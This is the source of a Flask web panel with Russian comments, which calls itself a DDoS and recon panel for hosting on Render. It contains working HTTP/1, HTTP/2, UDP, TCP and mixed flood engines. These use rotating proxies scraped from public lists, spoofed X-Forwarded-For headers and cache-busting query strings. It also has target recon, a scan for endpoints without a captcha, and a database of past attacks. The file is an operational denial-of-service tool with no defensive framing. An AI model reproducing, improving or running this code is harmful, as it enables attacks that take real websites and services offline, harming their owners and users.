#!/usr/bin/env python3
"""
hoster — ddos + recon панель. версия для Render.
запуск локально: python run.py
запуск на Render: gunicorn run:app
"""

import os
import time
import json
import sqlite3
import threading
import random
import socket
import asyncio
import tempfile
from pathlib import Path
from datetime import datetime
from functools import wraps
from urllib.parse import urlparse, urljoin

import requests as req
import aiohttp
from flask import (
    Flask, Response, g, jsonify, redirect, render_template,
    request, session, stream_with_context,
)
from bs4 import BeautifulSoup
import whois as whois_lib
import dns.resolver

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

# uvloop опционален — на Render недоступен
try:
    import uvloop
    uvloop.install()
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False


# ═══════════════════════════════════════════
# КОНФИГ
# ═══════════════════════════════════════════
APP_PASSWORD = os.getenv("NETSUITE_PASS", "hoster")
SECRET_KEY   = os.getenv("SECRET_KEY", os.urandom(32).hex())

TURNSTILE_SITEKEY = os.getenv("TURNSTILE_SITEKEY", "1x00000000000000000000AA")
TURNSTILE_SECRET  = os.getenv("TURNSTILE_SECRET",  "1x0000000000000000000000000000000AA")

# на Render рабочая папка read-only, БД кладём в /tmp
DB_PATH = Path(os.getenv("DB_PATH", "/tmp/hoster.db"))
DB_PATH.parent.mkdir(parents=True, exist_ok=True)

PORT = int(os.getenv("PORT", 5000))
HOST = os.getenv("HOST", "0.0.0.0")


# ═══════════════════════════════════════════
# БД
# ═══════════════════════════════════════════
def init_db():
    c = sqlite3.connect(DB_PATH)
    c.execute("""CREATE TABLE IF NOT EXISTS attacks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, mode TEXT, concurrency INTEGER, duration INTEGER,
        started_at TEXT, finished_at TEXT, sent INTEGER, errors INTEGER,
        status TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS attack_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        attack_id INTEGER, ts TEXT, line TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS recon_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        host TEXT, ts TEXT, data TEXT)""")
    c.commit()
    c.close()

init_db()


# ═══════════════════════════════════════════
# ПРОКСИ-ПУЛ
# ═══════════════════════════════════════════
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
]

class ProxyPool:
    def __init__(self):
        self.all = []
        self.alive = []
        self.bad = set()
        self.lock = threading.Lock()
        self.checking = False
        self.stats = {"loaded": 0, "alive": 0, "dead": 0, "last": 0}

    def load_all(self):
        loaded = set()
        for src in PROXY_SOURCES:
            try:
                r = req.get(src, timeout=15)
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "://" not in line:
                        line = "http://" + line
                    loaded.add(line)
            except Exception:
                continue
        with self.lock:
            self.all = list(loaded)
            self.alive = []
            self.stats["loaded"] = len(self.all)
        return len(self.all)

    def _check_one(self, proxy):
        try:
            r = req.get("http://httpbin.org/ip",
                        proxies={"http": proxy, "https": proxy}, timeout=5)
            if r.status_code == 200:
                return proxy
        except Exception:
            pass
        return None

    def check_all(self, workers=100):
        from concurrent.futures import ThreadPoolExecutor
        self.checking = True
        alive = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futures = [ex.submit(self._check_one, p) for p in self.all]
                for f in futures:
                    try:
                        r = f.result(timeout=10)
                        if r:
                            alive.append(r)
                    except Exception:
                        continue
        finally:
            with self.lock:
                self.alive = alive
                self.bad = set(self.all) - set(alive)
                self.stats["alive"] = len(alive)
                self.stats["dead"] = len(self.all) - len(alive)
                self.stats["last"] = time.time()
            self.checking = False
        return len(alive)

    def get(self):
        with self.lock:
            return random.choice(self.alive) if self.alive else None

    def alive_count(self):
        with self.lock:
            return len(self.alive)

POOL = ProxyPool()


# ═══════════════════════════════════════════
# RECON
# ═══════════════════════════════════════════
def resolve_ip(host):
    try:
        return socket.gethostbyname(host)
    except Exception:
        return None

def reverse_dns(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None

def get_dns(host):
    out = {}
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME"):
        try:
            ans = dns.resolver.resolve(host, rtype, lifetime=5)
            out[rtype] = [str(r) for r in ans][:5]
        except Exception:
            continue
    return out

def get_whois(host):
    try:
        w = whois_lib.whois(host)
        def fmt(x):
            if isinstance(x, list):
                return x[0] if x else "—"
            if isinstance(x, datetime):
                return x.strftime("%Y-%m-%d")
            return str(x) if x else "—"
        return {
            "created":   fmt(getattr(w, "creation_date", None)),
            "expires":   fmt(getattr(w, "expiration_date", None)),
            "updated":   fmt(getattr(w, "updated_date", None)),
            "registrar": fmt(getattr(w, "registrar", None)),
            "country":   fmt(getattr(w, "country", None)),
            "org":       fmt(getattr(w, "org", None)),
            "ns":        [str(x) for x in (getattr(w, "name_servers", []) or [])][:5],
        }
    except Exception as e:
        return {"error": str(e)}

def get_ip_info(ip):
    try:
        j = req.get(f"http://ip-api.com/json/{ip}"
                    "?fields=status,country,city,isp,org,as,hosting,proxy",
                    timeout=8).json()
        if j.get("status") == "success":
            return {
                "country": j.get("country", "—"),
                "city":    j.get("city", "—"),
                "isp":     j.get("isp", "—"),
                "org":     j.get("org", "—"),
                "asn":     j.get("as", "—"),
                "hosting": j.get("hosting", False),
                "proxy":   j.get("proxy", False),
            }
    except Exception:
        pass
    return {}

def tcp_check(host, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((host, port))
        s.close()
        return r == 0
    except Exception:
        return False

def full_recon(host, last_attack_ts=None):
    out = {"host": host}
    ip = resolve_ip(host)
    if not ip:
        out["error"] = "не резолвится"
        return out
    out["ip"] = ip
    out["reverse_dns"] = reverse_dns(ip) or "—"
    out["whois"] = get_whois(host)
    out["ip_info"] = get_ip_info(ip)
    out["dns"] = get_dns(host)

    t0 = time.time()
    alive = tcp_check(ip, 80, 3) or tcp_check(ip, 443, 3)
    latency = (time.time() - t0) * 1000

    if alive and latency > 1500:
        under = "возможна атака (высокая задержка)"
    elif alive and latency < 200:
        under = "работает нормально"
    elif not alive:
        under = "недоступен"
    else:
        under = "средняя задержка"

    cdn = "—"
    a = str(out["ip_info"].get("asn", "")).lower()
    o = str(out["ip_info"].get("org", "")).lower()
    if "cloudflare" in a or "cloudflare" in o: cdn = "Cloudflare"
    elif "akamai" in a: cdn = "Akamai"
    elif "fastly" in a: cdn = "Fastly"
    elif "amazon" in a or "aws" in a: cdn = "AWS"
    elif "google" in a: cdn = "Google Cloud"

    out["status"] = {
        "alive": "да" if alive else "нет",
        "latency_ms": f"{latency:.0f}",
        "cdn": cdn,
        "under_attack": under,
        "last_attack": (datetime.fromtimestamp(last_attack_ts)
                        .strftime("%Y-%m-%d %H:%M:%S")
                        if last_attack_ts else "никогда"),
    }
    return out


# ═══════════════════════════════════════════
# ДВИЖОК
# ═══════════════════════════════════════════
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/16.6",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile",
]

HEADER_POOL = []
for _ in range(512):
    HEADER_POOL.append({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "X-Forwarded-For":
            f"{random.randint(1,254)}.{random.randint(0,254)}."
            f"{random.randint(0,254)}.{random.randint(1,254)}",
    })

class AttackState:
    def __init__(self):
        self.running = False
        self.stop_flag = threading.Event()
        self.sent = 0
        self.errors = 0
        self.started = 0
        self.mode = ""
        self.target = ""
        self.concurrency = 0
        self.duration = 0
        self.logs = []
        self.lock = threading.Lock()

    def log(self, msg):
        line = f"{time.strftime('%H:%M:%S')} {msg}"
        with self.lock:
            self.logs.append(line)
            if len(self.logs) > 500:
                self.logs = self.logs[-500:]
        print(line, flush=True)

    def snapshot(self):
        with self.lock:
            elapsed = max(1, time.time() - self.started) if self.started else 1
            rps = self.sent / elapsed if self.started else 0
            return {
                "running": self.running,
                "sent": self.sent, "errors": self.errors,
                "rps": round(rps, 1),
                "elapsed": round(elapsed, 1) if self.started else 0,
                "mode": self.mode, "target": self.target,
                "concurrency": self.concurrency, "duration": self.duration,
                "uvloop": HAS_UVLOOP,
            }

STATE = AttackState()


def parse_target(target):
    if "://" not in target:
        target = "http://" + target
    p = urlparse(target)
    host = p.hostname
    if not host:
        raise ValueError("нет хоста")
    use_ssl = p.scheme == "https"
    port = p.port or (443 if use_ssl else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return host, port, path, use_ssl


async def http1_flood(url, conc, use_proxy):
    connector = aiohttp.TCPConnector(
        limit=conc * 2, limit_per_host=conc * 2,
        ttl_dns_cache=600, use_dns_cache=True,
        ssl=False, force_close=False)
    timeout = aiohttp.ClientTimeout(total=4, connect=1)
    session = aiohttp.ClientSession(connector=connector, timeout=timeout)

    async def one():
        if STATE.stop_flag.is_set(): return
        try:
            h = random.choice(HEADER_POOL)
            u = f"{url}{'&' if '?' in url else '?'}_={random.randint(1,99999999)}"
            kw = {"headers": h, "ssl": False}
            if use_proxy:
                p = POOL.get()
                if p: kw["proxy"] = p
            async with session.get(u, **kw) as r:
                await r.read()
                STATE.sent += 1
        except Exception:
            STATE.errors += 1

    try:
        while not STATE.stop_flag.is_set():
            tasks = [asyncio.create_task(one()) for _ in range(conc)]
            await asyncio.gather(*tasks, return_exceptions=True)
            del tasks
    finally:
        await session.close()


async def http2_flood(url, conc):
    if not HAS_HTTPX:
        return await http1_flood(url, conc, False)
    limits = httpx.Limits(max_connections=conc, max_keepalive_connections=conc)
    timeout = httpx.Timeout(4.0, connect=2.0)
    async with httpx.AsyncClient(http2=True, limits=limits,
                                  timeout=timeout, verify=False) as client:
        sem = asyncio.Semaphore(conc)
        async def one():
            async with sem:
                if STATE.stop_flag.is_set(): return
                try:
                    h = random.choice(HEADER_POOL)
                    u = f"{url}{'&' if '?' in url else '?'}_={random.randint(1,99999999)}"
                    await client.get(u, headers=h)
                    STATE.sent += 1
                except Exception:
                    STATE.errors += 1
        while not STATE.stop_flag.is_set():
            tasks = [asyncio.create_task(one()) for _ in range(conc)]
            await asyncio.gather(*tasks, return_exceptions=True)
            del tasks


async def udp_flood(host, port, conc, size=64):
    loop = asyncio.get_event_loop()
    targets = []
    try:
        for info in socket.getaddrinfo(host, port, type=socket.SOCK_DGRAM):
            targets.append(info[4])
    except Exception:
        return
    if not targets: return
    target = random.choice(targets)

    sock_pool = []
    for _ in range(min(conc, 512)):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except: pass
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            except: pass
            s.setblocking(False)
            sock_pool.append(s)
        except Exception:
            continue
    if not sock_pool: return
    payload = os.urandom(size)

    async def burst(s):
        try:
            await loop.sock_sendto(s, payload, target)
            STATE.sent += 1
        except Exception:
            STATE.errors += 1

    try:
        while not STATE.stop_flag.is_set():
            tasks = [asyncio.create_task(burst(s)) for s in sock_pool]
            await asyncio.gather(*tasks, return_exceptions=True)
            del tasks
    finally:
        for s in sock_pool:
            try: s.close()
            except: pass


async def tcp_flood(host, port, conc):
    loop = asyncio.get_event_loop()
    sem = asyncio.Semaphore(conc)
    async def one():
        async with sem:
            if STATE.stop_flag.is_set(): return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                await asyncio.wait_for(loop.sock_connect(s, (host, port)), timeout=2)
                s.close()
                STATE.sent += 1
            except Exception:
                STATE.errors += 1
    while not STATE.stop_flag.is_set():
        tasks = [asyncio.create_task(one()) for _ in range(conc)]
        await asyncio.gather(*tasks, return_exceptions=True)
        del tasks


def _run_loop(mode, host, port, url, conc):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def main():
        use_proxy = POOL.alive_count() > 0
        if mode == "http":    await http1_flood(url, conc, use_proxy)
        elif mode == "http2": await http2_flood(url, conc)
        elif mode == "udp":   await udp_flood(host, port, conc)
        elif mode == "tcp":   await tcp_flood(host, port, conc)
        elif mode == "mix":
            await asyncio.gather(
                http1_flood(url, max(1, conc // 2), use_proxy),
                udp_flood(host, port, max(1, conc // 2)),
                return_exceptions=True)

    try:
        loop.run_until_complete(main())
    except Exception as e:
        STATE.log(f"loop error: {e}")
    finally:
        try: loop.close()
        except: pass


def _reporter():
    while not STATE.stop_flag.is_set():
        time.sleep(1)
        s = STATE.snapshot()
        STATE.log(f"sent={s['sent']:,}  err={s['errors']:,}  rps={s['rps']:,.0f}")


def start_attack(mode, target, conc, duration):
    if STATE.running:
        return False, "атака уже идёт"
    try:
        host, port, path, use_ssl = parse_target(target)
    except Exception as e:
        return False, f"плохой target: {e}"

    scheme = "https" if use_ssl else "http"
    url = f"{scheme}://{host}:{port}{path}"

    STATE.running = True
    STATE.stop_flag.clear()
    STATE.sent = 0; STATE.errors = 0
    STATE.started = time.time()
    STATE.mode = mode; STATE.target = target
    STATE.concurrency = conc; STATE.duration = duration
    STATE.logs = []
    STATE.log(f"запуск: mode={mode} target={host}:{port}{path}")
    STATE.log(f"conc={conc} dur={duration}с прокси={POOL.alive_count()}")

    def runner():
        threading.Thread(target=_reporter, daemon=True).start()
        _run_loop(mode, host, port, url, conc)
        STATE.running = False
        STATE.log(f"завершено sent={STATE.sent:,} err={STATE.errors:,}")

    threading.Thread(target=runner, daemon=True).start()
    return True, f"атака на {host}:{port}"


def stop_attack():
    STATE.stop_flag.set()
    STATE.log("стоп")


# ═══════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════
app = Flask(__name__)
app.secret_key = SECRET_KEY


def db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exc):
    d = g.pop("db", None)
    if d: d.close()


def login_required(f):
    @wraps(f)
    def w(*a, **kw):
        if not session.get("auth"):
            return redirect("/login")
        return f(*a, **kw)
    return w


def verify_turnstile(token):
    try:
        r = req.post("https://challenges.cloudflare.com/turnstile/v0/siteverify",
                     data={"secret": TURNSTILE_SECRET, "response": token}, timeout=10)
        return r.json().get("success", False)
    except Exception:
        return False


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password", "") == APP_PASSWORD:
            session["auth"] = True
            return redirect("/")
        return render_template("login.html", error="неверный пароль")
    return render_template("login.html", error=None)


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


@app.route("/")
@login_required
def index():
    return render_template("index.html",
                           sitekey=TURNSTILE_SITEKEY,
                           uvloop=HAS_UVLOOP)


@app.route("/healthz")
def healthz():
    return "ok", 200


@app.route("/api/state")
@login_required
def api_state():
    return jsonify(STATE.snapshot())


@app.route("/api/logs/stream")
@login_required
def api_logs_stream():
    def gen():
        last_idx = 0
        empty_count = 0
        while True:
            with STATE.lock:
                logs = list(STATE.logs)
            new = logs[last_idx:]
            last_idx = len(logs)
            for line in new:
                yield f"data: {json.dumps({'line': line})}\n\n"
            yield f"data: {json.dumps({'state': STATE.snapshot()})}\n\n"
            time.sleep(0.5)
            empty_count += 1
            if empty_count > 7200:
                break
    return Response(stream_with_context(gen()), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache",
                             "X-Accel-Buffering": "no"})


@app.route("/api/attack/start", methods=["POST"])
@login_required
def api_attack_start():
    d = request.json or {}
    if not verify_turnstile(d.get("captcha_token", "")):
        return jsonify({"ok": False, "error": "капча не пройдена"}), 400
    target = (d.get("target") or "").strip()
    mode = d.get("mode", "http")
    conc = int(d.get("concurrency", 1000))
    dur = int(d.get("duration", 60))
    if not target:
        return jsonify({"ok": False, "error": "target пустой"}), 400

    ok, msg = start_attack(mode, target, conc, dur)
    if not ok:
        return jsonify({"ok": False, "error": msg}), 400

    c = db()
    cur = c.execute(
        "INSERT INTO attacks (target, mode, concurrency, duration, started_at, status) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (target, mode, conc, dur, datetime.now().isoformat(), "running"))
    c.commit()
    session["last_attack_id"] = cur.lastrowid
    return jsonify({"ok": True, "attack_id": cur.lastrowid})


@app.route("/api/attack/stop", methods=["POST"])
@login_required
def api_attack_stop():
    stop_attack()
    aid = session.get("last_attack_id")
    if aid:
        c = db()
        s = STATE.snapshot()
        c.execute("UPDATE attacks SET finished_at=?, sent=?, errors=?, status=? WHERE id=?",
                  (datetime.now().isoformat(), s["sent"], s["errors"], "stopped", aid))
        with STATE.lock:
            for line in STATE.logs:
                c.execute("INSERT INTO attack_logs (attack_id, ts, line) VALUES (?, ?, ?)",
                          (aid, datetime.now().isoformat(), line))
        c.commit()
    return jsonify({"ok": True})


@app.route("/api/attacks")
@login_required
def api_attacks():
    rows = db().execute("SELECT * FROM attacks ORDER BY id DESC LIMIT 200").fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/attacks/<int:aid>/logs")
@login_required
def api_attack_logs(aid):
    rows = db().execute("SELECT line FROM attack_logs WHERE attack_id=? ORDER BY id",
                        (aid,)).fetchall()
    return jsonify({"logs": [r["line"] for r in rows]})


@app.route("/api/attacks/<int:aid>", methods=["DELETE"])
@login_required
def api_attack_delete(aid):
    c = db()
    c.execute("DELETE FROM attack_logs WHERE attack_id=?", (aid,))
    c.execute("DELETE FROM attacks WHERE id=?", (aid,))
    c.commit()
    return jsonify({"ok": True})


@app.route("/api/recon", methods=["POST"])
@login_required
def api_recon():
    d = request.json or {}
    host = (d.get("host") or "").strip()
    if not host:
        return jsonify({"ok": False, "error": "пусто"}), 400
    if "://" in host:
        host = urlparse(host).hostname or host
    host = host.split("/")[0].split(":")[0]

    c = db()
    row = c.execute("SELECT MAX(started_at) AS last FROM attacks WHERE target LIKE ?",
                    (f"%{host}%",)).fetchone()
    last_ts = None
    if row and row["last"]:
        try: last_ts = datetime.fromisoformat(row["last"]).timestamp()
        except: last_ts = None

    data = full_recon(host, last_ts)
    c.execute("INSERT INTO recon_history (host, ts, data) VALUES (?, ?, ?)",
              (host, datetime.now().isoformat(), json.dumps(data)))
    c.commit()
    return jsonify({"ok": True, "data": data})


@app.route("/api/proxy/load", methods=["POST"])
@login_required
def api_proxy_load():
    n = POOL.load_all()
    return jsonify({"ok": True, "loaded": n})


@app.route("/api/proxy/check", methods=["POST"])
@login_required
def api_proxy_check():
    if POOL.checking:
        return jsonify({"ok": False, "error": "уже проверяется"}), 400
    threading.Thread(target=POOL.check_all, daemon=True).start()
    return jsonify({"ok": True})


@app.route("/api/proxy/status")
@login_required
def api_proxy_status():
    return jsonify({
        "loaded": POOL.stats["loaded"],
        "alive": POOL.alive_count(),
        "dead": POOL.stats["dead"],
        "checking": POOL.checking,
    })


@app.route("/api/scan_endpoints", methods=["POST"])
@login_required
def api_scan_endpoints():
    import re as _re
    d = request.json or {}
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"ok": False, "error": "пусто"}), 400
    if "://" not in url:
        url = "http://" + url
    try:
        r = req.get(url, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
        html = r.text
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400

    soup = BeautifulSoup(html, "html.parser")
    links = set()
    for a in soup.find_all("a", href=True): links.add(urljoin(url, a["href"]))
    for f in soup.find_all("form", action=True): links.add(urljoin(url, f["action"]))
    for u in _re.findall(r'["\'](/[a-zA-Z0-9_\-/\.]+)["\']', html):
        links.add(urljoin(url, u))

    found = []
    cap = ["captcha", "recaptcha", "hcaptcha", "turnstile"]
    for link in list(links)[:150]:
        try:
            rr = req.get(link, timeout=5, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
            body = rr.text[:5000].lower()
            if rr.status_code in (200, 201, 400, 401, 405) and not any(m in body for m in cap):
                found.append({"url": link, "status": rr.status_code})
        except Exception:
            continue
    return jsonify({"ok": True, "found": found})


# ═══════════════════════════════════════════
# ЛОКАЛЬНЫЙ ЗАПУСК (на Render не сработает)
# ═══════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 55)
    print("  hoster — локальный запуск")
    print("=" * 55)
    print(f"  пароль:   {APP_PASSWORD}")
    print(f"  uvloop:   {'да' if HAS_UVLOOP else 'нет'}")
    print(f"  httpx/h2: {'да' if HAS_HTTPX else 'нет'}")
    print(f"  БД:       {DB_PATH}")
    print(f"  сервер:   http://{HOST}:{PORT}")
    print("=" * 55)
    app.run(host=HOST, port=PORT, debug=False, threaded=True)
